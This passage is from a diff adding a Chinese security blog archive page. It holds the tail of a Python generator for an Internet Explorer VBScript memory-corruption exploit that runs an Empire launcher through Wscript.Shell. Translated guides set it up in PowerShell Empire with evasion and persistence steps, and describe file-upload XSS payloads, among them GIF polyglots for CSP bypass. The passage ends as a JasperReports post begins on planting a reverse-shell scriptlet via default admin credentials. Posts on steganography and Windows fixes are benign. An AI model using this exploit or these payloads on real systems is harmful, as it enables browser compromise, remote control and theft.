\n"</span></div><div class="line">			code += <span class="string">"        Function exploit (arg1)\n"</span></div><div class="line">			code += <span class="string">"            Dim addr\n"</span></div><div class="line">			code += <span class="string">"            Dim csession\n"</span></div><div class="line">			code += <span class="string">"            Dim olescript\n"</span></div><div class="line">			code += <span class="string">"            Dim mem\n"</span></div><div class="line">			code += <span class="string">"		\n"</span></div><div class="line">			code += <span class="string">"		\n"</span></div><div class="line">			code += <span class="string">"            Set dm = New Dummy\n"</span></div><div class="line">			code += <span class="string">"		\n"</span></div><div class="line">			code += <span class="string">"            addr = getAddr(arg1, dm)\n"</span></div><div class="line">			code += <span class="string">"		\n"</span></div><div class="line">			code += <span class="string">"            mem = leakMem(arg1, addr + 8)\n"</span></div><div class="line">			code += <span class="string">"            csession = strToInt(Mid(mem, 3, 2))\n"</span></div><div class="line">			code += <span class="string">"		\n"</span></div><div class="line">			code += <span class="string">"            mem = leakMem(arg1, csession + 4)\n"</span></div><div class="line">			code += <span class="string">"            olescript = strToInt(Mid(mem, 1, 2))\n"</span></div><div class="line">			code += <span class="string">"            overwrite arg1, olescript + &amp;H174\n"</span></div><div class="line">			code += <span class="string">"	    Set Object = CreateObject(\"Wscript.Shell\")\n"</span></div><div class="line">			code +=	<span class="string">"		Object.run(\""</span></div><div class="line">			code += 		launcher + 	<span class="string">"\")\n"</span></div><div class="line">			code += <span class="string">"        End Function\n"</span></div><div class="line">			code += <span class="string">"		\n"</span></div><div class="line">			code += <span class="string">"        Function triggerBug\n"</span></div><div class="line">			code += <span class="string">"            aw.Resize()\n"</span></div><div class="line">			code += <span class="string">"            Dim i\n"</span></div><div class="line">			code += <span class="string">"            For i = 0 To 32\n"</span></div><div class="line">			code += <span class="string">"                ' 24000x2 + 6 = 48006 bytes\n"</span></div><div class="line">			code += <span class="string">"                y(i) = Mid(x, 1, 24000)\n"</span></div><div class="line">			code += <span class="string">"            Next\n"</span></div><div class="line">			code += <span class="string">"        End Function\n"</span></div><div class="line">			code += <span class="string">"    &lt;/script&gt;\n"</span></div><div class="line">			code += <span class="string">"		\n"</span></div><div class="line">			code += <span class="string">"    &lt;script type=\"text/javascript\"&gt;\n"</span></div><div class="line">			code += <span class="string">"        function strToInt(s)\n"</span></div><div class="line">			code += <span class="string">"        &#123;\n"</span></div><div class="line">			code += <span class="string">"            return s.charCodeAt(0) | (s.charCodeAt(1) &lt;&lt; 16);\n"</span></div><div class="line">			code += <span class="string">"        &#125;\n"</span></div><div class="line">			code += <span class="string">"        function intToStr(x)\n"</span></div><div class="line">			code += <span class="string">"        &#123;\n"</span></div><div class="line">			code += <span class="string">"            return String.fromCharCode(x &amp; 0xffff) + String.fromCharCode(x &gt;&gt; 16);\n"</span></div><div class="line">			code += <span class="string">"        &#125;\n"</span></div><div class="line">			code += <span class="string">"        var o;\n"</span></div><div class="line">			code += <span class="string">"        o = &#123;\"valueOf\": function () &#123;\n"</span></div><div class="line">			code += <span class="string">"                triggerBug();\n"</span></div><div class="line">			code += <span class="string">"                return 1;\n"</span></div><div class="line">			code += <span class="string">"            &#125;&#125;;\n"</span></div><div class="line">			code += <span class="string">"        setTimeout(function() &#123;exploit(o);&#125;, 50);\n"</span></div><div class="line">			code += <span class="string">"    &lt;/script&gt;\n"</span></div><div class="line">			code += <span class="string">"&lt;/body&gt;\n"</span></div><div class="line">			code += <span class="string">"&lt;/html&gt;"</span></div><div class="line"></div><div class="line">	<span class="keyword">return</span> code</div></pre></td></tr></table></figure>
+<p>ms16.py</p>
+<p>首先我们可以从<a href="https://github.com/PowerShellEmpire/Empire" target="_blank" rel="external">Github</a>获取Empire</p>
+<p><img src="https://i0.wp.com/www.cgsec.co.uk/wp-content/uploads/2016/09/1.png?resize=661%2C418&amp;ssl=1" alt="Empire Downloading"></p>
+<p>现在我们已经下载了Empire，接下来我们要安装apache2以便于我们把索引页面直接放到/var/www/html路径下。这一步是可选的，因为大多数人都想改变输出位置，模糊它来逃避杀毒引擎或者类似的产品。</p>
+<p><img src="https://i1.wp.com/www.cgsec.co.uk/wp-content/uploads/2016/09/2.png?resize=661%2C418&amp;ssl=1" alt="Installing Apache2"><br>接下来该添加我们的新规则了。这需要将脚本放在/lib/stagers下并且运行Empire的install.sh脚本去添加并运行它。如果你的运行在Ubuntu环境中，你可能要在运行这些脚本之前去安装pip。</p>
+<p><img src="https://i0.wp.com/www.cgsec.co.uk/wp-content/uploads/2016/09/3.png?resize=661%2C418&amp;ssl=1" alt="Empire Installation"><br>现在我们已经准备好并要第一次去启动Empire了。如果一切都顺利的话我们应该可以去使用我们添加的ms16脚本、设置我们的输出文件到/var/www/html/index.html并且放置直接目标到其中。更高级的用户可能想要去设置一些稍微复杂的到服务中来利用不同客户或不同的向量来混淆视听，这些就已经超出本文要描述的范围了。</p>
+<p>我个人更偏向于设置443端口的监听以期bypass一些防火墙并逃避一些检测机制。</p>
+<p><img src="https://i0.wp.com/www.cgsec.co.uk/wp-content/uploads/2016/09/4.png?resize=925%2C546&amp;ssl=1" alt="Empire Listener"><br>现在去生成我们的恶意HTML</p>
+<p><img src="https://i1.wp.com/www.cgsec.co.uk/wp-content/uploads/2016/09/5.png?resize=925%2C546&amp;ssl=1" alt="Stager Generation"></p>
+<p>现在当你的服务被某个使用带有相关漏洞浏览器的用户浏览的时候，这个攻击载荷将被触发同时你将看到一个新的代理在Empire中。使用持久性模块创建任务通常是个好注意，相似的也可以确保你不因为重新启动而丢失权限。这些可以通过设置自动运行的代理从而设置为自动运行一个新的客户端连接。</p>
+<p><img src="https://i1.wp.com/www.cgsec.co.uk/wp-content/uploads/2016/09/7.png?resize=925%2C546&amp;ssl=1" alt="New Agent"></p>
+
+          
+        
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+  <link itemprop="mainEntityOfPage" href="http://zer0yu.github.io/2017/01/22/XSS姿势——文件上传XSS/">
+
+  <span style="display:none" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <meta itemprop="name" content="ZEROYU">
+    <meta itemprop="description" content="">
+    <meta itemprop="image" content="/images/avatar.gif">
+  </span>
+
+  <span style="display:none" itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+    <meta itemprop="name" content="ZEROYU">
+    <span style="display:none" itemprop="logo" itemscope itemtype="http://schema.org/ImageObject">
+      <img style="display:none;" itemprop="url image" alt="ZEROYU" src="">
+    </span>
+  </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                
+                <a class="post-title-link" href="/2017/01/22/XSS姿势——文件上传XSS/" itemprop="url">
+                  XSS姿势——文件上传XSS
+                </a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-01-22T11:20:58+08:00">
+                2017-01-22
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
+                </span>
+                <a href="/2017/01/22/XSS姿势——文件上传XSS/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count ds-thread-count" data-thread-key="2017/01/22/XSS姿势——文件上传XSS/" itemprop="commentCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+
+          
+          
+             <span id="/2017/01/22/XSS姿势——文件上传XSS/" class="leancloud_visitors" data-flag-title="XSS姿势——文件上传XSS">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">阅读次数 </span>
+               
+                 <span class="leancloud-visitors-count"></span>
+             </span>
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h1 id="0x01-简单介绍"><a href="#0x01-简单介绍" class="headerlink" title="0x01 简单介绍"></a>0x01 简单介绍</h1><hr>
+<p>一个文件上传点是执行XSS应用程序的绝佳机会。很多网站都有用户权限上传个人资料图片的上传点，你有很多机会找到相关漏洞。如果碰巧是一个self XSS，你可以看看这篇文章。</p>
+<h1 id="0x02-实例分析"><a href="#0x02-实例分析" class="headerlink" title="0x02 实例分析"></a>0x02 实例分析</h1><hr>
+<p>首先基本上我们都可以找到类似下面的一个攻击入口点，我觉得这个并不难。</p>
+<h3 id="姿势一：文件名方式"><a href="#姿势一：文件名方式" class="headerlink" title="姿势一：文件名方式"></a>姿势一：文件名方式</h3><p>文件名本身可能会反映在页面所以一个带有XSS命名的文件便可以起到攻击作用。</p>
+<p><img src="http://static.wooyun.org/upload/image/201604/2016041510130259461.gif" alt="p1"></p>
+<p>虽然我没有准备靶场，但是你可以选择在<a href="http://www.w3schools.com/jsref/tryit.asp?filename=tryjsref_fileupload_value" target="_blank" rel="external">W3Schools</a>练习这种XSS 。</p>
+<h3 id="姿势二：Metadata"><a href="#姿势二：Metadata" class="headerlink" title="姿势二：Metadata"></a>姿势二：Metadata</h3><p>使用<a href="http://www.sno.phy.queensu.ca/~phil/exiftool/" target="_blank" rel="external">exiftool</a>这个工具可以通过改变EXIF  metadata进而一定几率引起某处反射：</p>
+<p>例如：</p>
+<p><img src="http://static.wooyun.org//drops/20160414/2016041415305935841.jpg" alt="p2"></p>
+<h3 id="姿势三：Content"><a href="#姿势三：Content" class="headerlink" title="姿势三：Content"></a>姿势三：Content</h3><p>如果应用允许上传SVG格式的文件（其实就是一个图像类型的），那么带有以下content的文件可以被用来触发XSS：</p>
+<p>一个 PoC用来验证。你可以通过访问brutelogic.com.br/poc.svg看到效果</p>
+<h3 id="姿势四：Source"><a href="#姿势四：Source" class="headerlink" title="姿势四：Source"></a>姿势四：Source</h3><p>建立一个携带有JavaScript payload的GIF图像用作一个脚本的源。这对绕过CSP（内容安全策略）保护“script-src ‘self’”（即不允许使用示例的这种xss方式进行攻击<code>alert(1)</code>）是很有用的，但前提是我们能够成功地在相同的域注入，如下所示。</p>
+<p><img src="http://static.wooyun.org//drops/20160415/2016041501523324712.gif" alt="p3"></p>
+<p>要创建这样的图像需要这个作为content 和 name，并使用.gif扩展名：</p>
+<p>这个GIF的图片头——GIF89a，作为alert function的变量分配给alert function。但是他们之间，还有一个被标注的XSS变量用来防止图片被恢复为text/HTML MIME文件类型，因此只需发送一个对这个文件的请求payload 就可以被执行。</p>
+<p>正如我们下面看到的，文件类unix命令和PHP函数中的exif_imagetype（）和getimagesize（）会将其识别为一个GIF文件。所以如果一个应用程序仅仅是使用这些方式验证是否是一个图像，那么该文件将可以上传成功（但可能在上传后被杀掉）。</p>
+<p><img src="http://static.wooyun.org//drops/20160414/2016041415280360223pic42.png" alt="p4"></p>
+<h1 id="0x03-最后"><a href="#0x03-最后" class="headerlink" title="0x03 最后"></a>0x03 最后</h1><hr>
+<p>如果你想知道更多的有其标志性ASCII字符可以用于一个javascript变量赋值的文件类型，看我随后的文章。</p>
+<p>也有很多比较详细的使用XSS和图像文件相结合绕过图形处理函数库过滤的例子。这方面的一个很好的例子是<a href="https://github.com/d0lph1n98/Defeating-PHP-GD-imagecreatefromgif" target="_blank" rel="external">here</a></p>
+<p>原文链接：<a href="http://brutelogic.com.br/blog/" target="_blank" rel="external">http://brutelogic.com.br/blog/</a></p>
+
+          
+        
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+  <link itemprop="mainEntityOfPage" href="http://zer0yu.github.io/2017/01/22/PNG文件中的LSB隐写/">
+
+  <span style="display:none" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <meta itemprop="name" content="ZEROYU">
+    <meta itemprop="description" content="">
+    <meta itemprop="image" content="/images/avatar.gif">
+  </span>
+
+  <span style="display:none" itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+    <meta itemprop="name" content="ZEROYU">
+    <span style="display:none" itemprop="logo" itemscope itemtype="http://schema.org/ImageObject">
+      <img style="display:none;" itemprop="url image" alt="ZEROYU" src="">
+    </span>
+  </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                
+                <a class="post-title-link" href="/2017/01/22/PNG文件中的LSB隐写/" itemprop="url">
+                  PNG文件中的LSB隐写
+                </a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-01-22T11:19:59+08:00">
+                2017-01-22
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
+                </span>
+                <a href="/2017/01/22/PNG文件中的LSB隐写/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count ds-thread-count" data-thread-key="2017/01/22/PNG文件中的LSB隐写/" itemprop="commentCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+
+          
+          
+             <span id="/2017/01/22/PNG文件中的LSB隐写/" class="leancloud_visitors" data-flag-title="PNG文件中的LSB隐写">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">阅读次数 </span>
+               
+                 <span class="leancloud-visitors-count"></span>
+             </span>
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <p>看到<a href="http://www.mottoin.com/88380.html" target="_blank" rel="external">Mott</a><a href="http://www.mottoin.com/88380.html" target="_blank" rel="external">oIn</a>的一篇文章时关于LSB隐写的，正好赶上中秋攒了一堆月饼没处放，就想由此出个题送送月饼。</p>
+<p>环境：<strong>win10        python27</strong></p>
+<p>lsb脚本使用了<a href="https://github.com/cyberinc/cloacked-pixel" target="_blank" rel="external">https://github.com/cyberinc/cloacked-pixel</a></p>
+<p>在使用之前需要几个python包，主要说下win10下如何安装这些包</p>
+<p><strong>1.PIL</strong></p>
+<p>这个包你按廖雪峰官网上的方法可能安装不上，所以我给出我自己的解决办法：</p>
+<p>到<a href="https://pypi.python.org/pypi/Pillow/2.7.0找到exe安装包双击" target="_blank" rel="external">https://pypi.python.org/pypi/Pillow/2.7.0找到exe安装包双击</a></p>
+<p>主要是PIL官方编译包有bug，所以最好下载第三方组织编译包，强烈推荐pillow的确好用</p>
+<p><strong>2.matplotlib</strong></p>
+<p>这个包的安装直接参考官方网站的方法，注意一步一步来。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">python -m pip install --upgrade pip</div><div class="line">python -m pip install --upgrade numpy</div><div class="line">python -m pip install --upgrade pytz</div><div class="line">python -m pip install --upgrade pyparsing</div><div class="line">python -m pip install --upgrade cycler</div><div class="line">python -m pip install --upgrade matplotlib</div></pre></td></tr></table></figure>
+<p>这就ok了，很简单。</p>
+<p>接下来按照MottoIn这个玩就好了。</p>
+
+          
+        
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+  <link itemprop="mainEntityOfPage" href="http://zer0yu.github.io/2017/01/22/win10只有edge可以打开网页/">
+
+  <span style="display:none" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <meta itemprop="name" content="ZEROYU">
+    <meta itemprop="description" content="">
+    <meta itemprop="image" content="/images/avatar.gif">
+  </span>
+
+  <span style="display:none" itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+    <meta itemprop="name" content="ZEROYU">
+    <span style="display:none" itemprop="logo" itemscope itemtype="http://schema.org/ImageObject">
+      <img style="display:none;" itemprop="url image" alt="ZEROYU" src="">
+    </span>
+  </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                
+                <a class="post-title-link" href="/2017/01/22/win10只有edge可以打开网页/" itemprop="url">
+                  win10只有edge可以打开网页
+                </a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-01-22T11:19:37+08:00">
+                2017-01-22
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
+                </span>
+                <a href="/2017/01/22/win10只有edge可以打开网页/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count ds-thread-count" data-thread-key="2017/01/22/win10只有edge可以打开网页/" itemprop="commentCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+
+          
+          
+             <span id="/2017/01/22/win10只有edge可以打开网页/" class="leancloud_visitors" data-flag-title="win10只有edge可以打开网页">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">阅读次数 </span>
+               
+                 <span class="leancloud-visitors-count"></span>
+             </span>
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <p>按住win+x</p>
+<p>然后选择“命令提示符（管理员）”</p>
+<p>输入 netsh winsock reset</p>
+<p>重启就好了。。</p>
+
+          
+        
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+  <link itemprop="mainEntityOfPage" href="http://zer0yu.github.io/2017/01/22/figlet-一款很好用的生成字符画的工具/">
+
+  <span style="display:none" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <meta itemprop="name" content="ZEROYU">
+    <meta itemprop="description" content="">
+    <meta itemprop="image" content="/images/avatar.gif">
+  </span>
+
+  <span style="display:none" itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+    <meta itemprop="name" content="ZEROYU">
+    <span style="display:none" itemprop="logo" itemscope itemtype="http://schema.org/ImageObject">
+      <img style="display:none;" itemprop="url image" alt="ZEROYU" src="">
+    </span>
+  </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                
+                <a class="post-title-link" href="/2017/01/22/figlet-一款很好用的生成字符画的工具/" itemprop="url">
+                  figlet--一款很好用的生成字符画的工具
+                </a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-01-22T11:05:35+08:00">
+                2017-01-22
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
+                </span>
+                <a href="/2017/01/22/figlet-一款很好用的生成字符画的工具/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count ds-thread-count" data-thread-key="2017/01/22/figlet-一款很好用的生成字符画的工具/" itemprop="commentCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+
+          
+          
+             <span id="/2017/01/22/figlet-一款很好用的生成字符画的工具/" class="leancloud_visitors" data-flag-title="figlet--一款很好用的生成字符画的工具">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">阅读次数 </span>
+               
+                 <span class="leancloud-visitors-count"></span>
+             </span>
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <p>安装：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">apt-get install figlet</div></pre></td></tr></table></figure>
+<p><img src="http://ok44mzy2k.bkt.clouddn.com/flight.png" alt="1"></p>
+
+          
+        
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+  <link itemprop="mainEntityOfPage" href="http://zer0yu.github.io/2017/01/22/北京之行的感悟/">
+
+  <span style="display:none" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <meta itemprop="name" content="ZEROYU">
+    <meta itemprop="description" content="">
+    <meta itemprop="image" content="/images/avatar.gif">
+  </span>
+
+  <span style="display:none" itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+    <meta itemprop="name" content="ZEROYU">
+    <span style="display:none" itemprop="logo" itemscope itemtype="http://schema.org/ImageObject">
+      <img style="display:none;" itemprop="url image" alt="ZEROYU" src="">
+    </span>
+  </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                
+                <a class="post-title-link" href="/2017/01/22/北京之行的感悟/" itemprop="url">
+                  北京之行的感悟
+                </a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-01-22T11:04:35+08:00">
+                2017-01-22
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
+                </span>
+                <a href="/2017/01/22/北京之行的感悟/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count ds-thread-count" data-thread-key="2017/01/22/北京之行的感悟/" itemprop="commentCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+
+          
+          
+             <span id="/2017/01/22/北京之行的感悟/" class="leancloud_visitors" data-flag-title="北京之行的感悟">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">阅读次数 </span>
+               
+                 <span class="leancloud-visitors-count"></span>
+             </span>
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <p>​    已经很晚了，一般是不写这种文章的，但这次去北京的确有很多收获和感悟，所以想在此记录一下。</p>
+<p>​    这次北京之行的路演，依旧按照平时的答辩模式，最终也取得了不错的效果。百度的负责人对我们团队印象很深，也是三人团队的配合还不错，所以 最终也取得了不错的成绩。当然这次收获最大的并不是我们团队的表现，而是其它大学的。北邮的乐享奇迹科技有限公司给我的印象很深，他们有一个很完善的团队组织架构，并且基于一个预约平台衍生出了很多APP；还有第二组那个研究生基于原来学长的东西进一步完善，这也是一个思路；而后就是那个博士生的盲人系统，很有想法；最后是那个外卖APP，市场调查做的很详细。</p>
+<p>​    总之，我觉得，对于社团而言也可以开发一些这种核心的东西作为一种积累；还有就是成立公司。</p>
+
+          
+        
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+  <link itemprop="mainEntityOfPage" href="http://zer0yu.github.io/2017/01/22/Hacking-JasperReports-隐藏shell的特征/">
+
+  <span style="display:none" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <meta itemprop="name" content="ZEROYU">
+    <meta itemprop="description" content="">
+    <meta itemprop="image" content="/images/avatar.gif">
+  </span>
+
+  <span style="display:none" itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+    <meta itemprop="name" content="ZEROYU">
+    <span style="display:none" itemprop="logo" itemscope itemtype="http://schema.org/ImageObject">
+      <img style="display:none;" itemprop="url image" alt="ZEROYU" src="">
+    </span>
+  </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                
+                <a class="post-title-link" href="/2017/01/22/Hacking-JasperReports-隐藏shell的特征/" itemprop="url">
+                  Hacking JasperReports-隐藏shell的特征
+                </a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-01-22T10:59:14+08:00">
+                2017-01-22
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
+                </span>
+                <a href="/2017/01/22/Hacking-JasperReports-隐藏shell的特征/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count ds-thread-count" data-thread-key="2017/01/22/Hacking-JasperReports-隐藏shell的特征/" itemprop="commentCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+
+          
+          
+             <span id="/2017/01/22/Hacking-JasperReports-隐藏shell的特征/" class="leancloud_visitors" data-flag-title="Hacking JasperReports-隐藏shell的特征">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">阅读次数 </span>
+               
+                 <span class="leancloud-visitors-count"></span>
+             </span>
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <p>不久前，我的同事跟我在对一个客户端进行渗透测试。我们确实发现的一件事是,他们留下了几个联网的JasperReports服务器。寻找默认管理帐户的用户名并没有花费太多的精力。<br><img src="https://foxglovesecurity.files.wordpress.com/2016/10/login.png?w=960" alt="login"></p>
+<p>也没有用多久我们就猜解出密码是“jasperadmin”</p>
+<p>我从前听过JasperReports但从来没有碰到过要对它进行渗透测试。一个快速的google搜索也没有对前期工作产生多大的作用。尽管这个管理界面很不常见但是它也没有摆脱以某种方式来执行代码，所以顺利成章的我们开始在渗透旅程中把JasperReports渗透测试添加进“容易成功”的列表。</p>
+<h4 id="代码和小脚本"><a href="#代码和小脚本" class="headerlink" title="代码和小脚本"></a>代码和小脚本</h4><p>JasperReports的目的是提取数据从各种各样的来源，例如：databases, xml, flat files等等，并且基于用户定义的模板用某种方式生成一份漂亮的报告。模板在JasperReports被定义为“JRXML”文件，任何拥有创建编辑报告权限的用户都可以上传它。</p>
+<p>JasperReports的设计者允许数据在被包含在报告之前自定义操作。接下来就是利用一些小技巧用Java来编写一段脚本！我想也许你会看到这个。</p>
+<p>我们的目标呢，就是创建一个报告模板（JRXML file）当然是依旧定制的恶意脚本，当它运行时，我们可以收到一个shell。这篇文章的其余部分将会详细描述我们是如何将脚本和报告模板联系到一起的。</p>
+<h4 id="编辑模板"><a href="#编辑模板" class="headerlink" title="编辑模板"></a>编辑模板</h4><p>我们仅仅编辑一个存在的模板而不是创建一个。以下是我们将使用的模板。注意一下，过于复杂以及其中的90%是完全不必要的。下面这个只是一个带有“JasperStudio”的简单样本报告。35–42行是有趣的一个部分，我在这个部分插入了“ShellScriptlet”。</p>
+<p>shell.jrxml</p>
